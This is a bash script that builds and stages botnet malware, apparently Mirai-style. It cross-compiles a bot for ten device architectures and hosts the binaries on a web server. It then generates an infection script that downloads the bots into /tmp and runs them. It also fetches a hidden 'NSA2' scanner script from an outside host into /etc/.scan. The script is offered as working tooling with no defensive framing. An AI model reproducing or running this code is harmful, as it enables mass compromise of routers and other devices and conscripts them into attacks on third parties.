#!/bin/bash
#########################################
###############Made date#################
#########################################
#53 68 65 6e 72 6f 6e 20 69 73 20 77 61 74 63 68 69 6e 67 20 79 6f 75 20 2d 20 4e 53 41
echo -e "\e[0;36mMade by Savaged ; Savaged@riseup.net\x1b[0m"
echo -e "\e[0;36mThis version was made on 3/21/2015 and updated 12/29/2021"
echo -e "\e[0;36mIf you should at any point want to scan using LRAB, check in /etc/.scan and run it"
echo -e "\e[0;31mUsage: $0 if not executed like this, it will not fucking work."
echo -e "\e[0;36myou have 5 seconds to cancel this if you fucked up"
sleep 5

#########################################
###############NSA2##################
#########################################
NSA2='http://b.1339.cf/xulaihn.sh' #NSA2
#########################################
###############Botnames##################
#########################################
L1='jackmymipsel' #mipsel
L2='jackmymips'  #mips
L3='jackmysh4'    #sh4
L4='jackmyx86' #x86_64
L5='jackmyarmv6' #armv6l
L6='jackmyi686'   #i686
L7='jackmypowerpc'  #powerpc
L8='jackmyi586'  #i586
L9='jackmym68k'  #m68k
L10='jackmysparc'  #sparc

#########################################
##############Wgetlinks##################
#########################################
mips='http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2'
mipsel='http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2'
sh4='http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2'
x86_64='http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-x86_64.tar.bz2'
armv6l='http://distro.ibiblio.org/slitaz/sources/packages/c/cross-compiler-armv6l.tar.bz2'
i686='http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i686.tar.bz2'
ppc='http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2'
i586='http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i586.tar.bz2'
m68k='http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-m68k.tar.bz2'
sparc='http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sparc.tar.bz2'
mkdir /var/www
mkdir /var/www/html
#########################################
################MISC#####################
#########################################
mkdir /etc/.scan
cd /etc/.scan
wget --quiet $NSA2 -O NSA2.sh
cd /root
apt-get install tar -q
yum install tar -y -q
yum install bzip -y || yum install bzip2 -y
apt-get install bzip -y || apt-get install bzip2 -y
apt-get install curl
#########################################
################WGETS#################
#########################################
echo -e "\e[0;95mCompilers incoming."
if [ -d cross-compiler-mips ]
then
echo -e "\e[0;95mcross-compiler-mips is present, no need for wget"
else
wget --quiet $mips --no-check-certificate
tar -xvjf cross-compiler-mips*
fi
if [ -d cross-compiler-mipsel ]
then
echo -e "\e[0;95mcross-compiler-mipsel is present, no need for wget"
else
wget --quiet $mipsel --no-check-certificate
tar -xvjf cross-compiler-mipsel*
fi
if [ -d cross-compiler-sh4 ]
then
echo -e "\e[0;95mcross-compiler-sh4 is present, no need for wget"
else
wget --quiet $sh4 --no-check-certificate
tar -xvjf cross-compiler-sh4*
fi
if [ -d cross-compiler-x86_64 ]
then
echo -e "\e[0;95mcross-compiler-x86_64 is present, no need for wget"
else
wget --quiet $x86_64 --no-check-certificate
tar -xvjf cross-compiler-x86_64*
fi
if [ -d cross-compiler-armv6l ]
then
echo -e "\e[0;95mcross-compiler-armv6l is present, no need for wget"
else
wget --quiet $armv6l --no-check-certificate
tar -xvjf cross-compiler-armv6l*
fi
if [ -d cross-compiler-powerpc ]
then
echo -e "\e[0;95mcross-compiler-powerpc is present, no need for wget"
else
wget --quiet $ppc --no-check-certificate
tar -xvjf cross-compiler-powerpc*
fi
if [ -d cross-compiler-m68k ]
then
echo -e "\e[0;95mcross-compiler-m68k is present, no need for wget"
else
wget --quiet $m68k --no-check-certificate
tar -xvjf cross-compiler-m68k*
fi
if [ -d cross-compiler-sparc ]
then
echo -e "\e[0;95mcross-compiler-sparc is present, no need for wget"
else
wget --quiet $sparc --no-check-certificate
tar -xvjf cross-compiler-sparc*
fi
if [ -d cross-compiler-i586 ]
then
echo -e "\e[0;95mcross-compiler-i586 is present, no need for wget"
else
wget --quiet $i586 --no-check-certificate
tar -xvjf cross-compiler-i586*
fi
if [ -d cross-compiler-i686 ]
then
echo -e "\e[0;95mcross-compiler-i686 is present, no need for wget"
else
wget --quiet $i686 --no-check-certificate
tar -xvjf cross-compiler-i686*
fi
rm -rf *.tar.bz2
echo -e "\e[0;95mDone."
sleep 3

#########################################
##############Compiling##################
#########################################
./cross-compiler-mipsel/bin/mipsel-gcc -static -DMIPSEL -o $L1 $1 > /dev/null 2>&1
./cross-compiler-mips/bin/mips-gcc -static -Dmips -o $L2 $1 > /dev/null 2>&1
./cross-compiler-sh4/bin/sh4-gcc -static -Dsh4 -o $L3 $1 > /dev/null 2>&1
./cross-compiler-x86_64/bin/x86_64-gcc -static -Dx86_64 -o $L4 $1 > /dev/null 2>&1
./cross-compiler-armv6l/bin/armv6l-gcc -static -Darmv6l -o $L5 $1 > /dev/null 2>&1
./cross-compiler-i686/bin/i686-gcc -static -Di686 -o $L6 $1 > /dev/null 2>&1
./cross-compiler-powerpc/bin/powerpc-gcc -static -Dpowerpc -o $L7 $1 > /dev/null 2>&1
./cross-compiler-i586/bin/i586-gcc -static -Di586 -o $L8 $1 > /dev/null 2>&1
./cross-compiler-m86k/bin/m86k-gcc -static -Dm86k -o $L9 $1 > /dev/null 2>&1
./cross-compiler-sparc/bin/sparc-gcc -static -Dsparc -o $L10 $1 > /dev/null 2>&1
echo -e "\e[0;31mDone compiling binarys, stripped and bytes reduced."
sleep 2
mv jackmy* /var/www/html/

######################################
##############/'d'####################
######################################
echo -e "\e[0;92mIf you do not have apache/a webserver setup, cancel this and install it, stop being LAZY"
echo -e "\e[0;92mThis was removed because it's annoying to install it through bash, do it yourself."

#########################################
#########Setting up fucks.sh###########
#########################################
echo -e "\e[0;93mTouching fucks.sh"
rm -rf fucks.sh
cd /var/www/html/; touch fucks.sh
echo -e "\e[0;93mCreating Payload now."
echo -e "\e[0;93mThis will take a few, be patient.."
sleep 2
echo "cd /tmp && wget -q http://$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')/$L1 && chmod +x $L1 && ./$L1">> fucks.sh
echo "cd /tmp && wget -q http://$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')/$L2 && chmod +x $L2 && ./$L2">> fucks.sh
echo "cd /tmp && wget -q http://$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')/$L3 && chmod +x $L3 && ./$L3">> fucks.sh
echo "cd /tmp && wget -q http://$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')/$L4 && chmod +x $L4 && ./$L4">> fucks.sh
echo "cd /tmp && wget -q http://$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')/$L5 && chmod +x $L5 && ./$L5">> fucks.sh
echo "cd /tmp && wget -q http://$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')/$L6 && chmod +x $L6 && ./$L6">> fucks.sh
echo "cd /tmp && wget -q http://$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')/$L7 && chmod +x $L7 && ./$L7">> fucks.sh
echo "cd /tmp && wget -q http://$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')/$L8 && chmod +x $L8 && ./$L8">> fucks.sh
echo "cd /tmp && wget -q http://$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')/$L9 && chmod +x $L9 && ./$L9">> fucks.sh
echo "cd /tmp && wget -q http://$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')/$L10 && chmod +x $L10 && ./$L10">> fucks.sh
#########################################
###############ULIMIT#####################
#########################################
cd /root
ulimit -u 999999;ulimit -n 999999
echo "#.bashrc">> .bashrc
echo "#ulimit set">> .bashrc
echo "ulimit -u 999999">> .bashrc
echo "ulimit -n 999999">> .bashrc
bash
